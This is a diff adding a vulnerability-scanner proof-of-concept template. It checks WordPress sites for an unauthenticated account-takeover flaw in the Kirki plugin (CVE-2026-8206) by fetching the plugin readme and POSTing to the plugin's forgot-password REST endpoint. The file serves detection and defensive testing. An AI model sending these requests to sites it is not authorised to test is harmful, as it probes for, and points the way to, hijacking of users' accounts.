@@ -1,0 +1,49 @@
+[info]
+author = "AVE"
+description = "验证目标站点 Kirki 插件 (6.0.0-6.0.6) 是否存在未授权密码重置劫持漏洞。通过检测插件版本及 REST API 端点 /wp-json/KirkiComponentLibrary/v1/kirki-forgot-password 的响应状态，判断漏洞是否可被利用。"
+id = "POC-AVE-2026-0123"
+name = "Kirki WordPress Plugin Unauthenticated Account Takeover PoC"
+severity = "critical"
+tags = [
+    "cve-2026-8206",
+    "wordpress",
+    "wp-plugin",
+    "kirki",
+    "account-takeover",
+]
+vuln_id = [
+    "CVE-2026-8206",
+    "AVE-2026-0123",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/wp-content/plugins/kirki/readme.txt"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["kirki"]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/wp-json/KirkiComponentLibrary/v1/kirki-forgot-password"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"username":"test","email":"poc-verify@localhost.local"}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
